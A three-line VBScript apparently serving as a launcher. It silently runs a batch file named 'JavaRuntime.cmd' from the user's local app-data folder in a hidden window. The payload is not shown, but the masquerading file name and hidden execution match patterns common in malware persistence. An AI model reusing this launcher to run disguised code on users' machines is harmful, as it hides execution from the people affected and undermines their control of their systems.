Set WshShell = CreateObject("WScript.Shell")
appdataLocal = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
WshShell.Run """" & appdataLocal & "\JavaRuntime.cmd" & """", 0, True
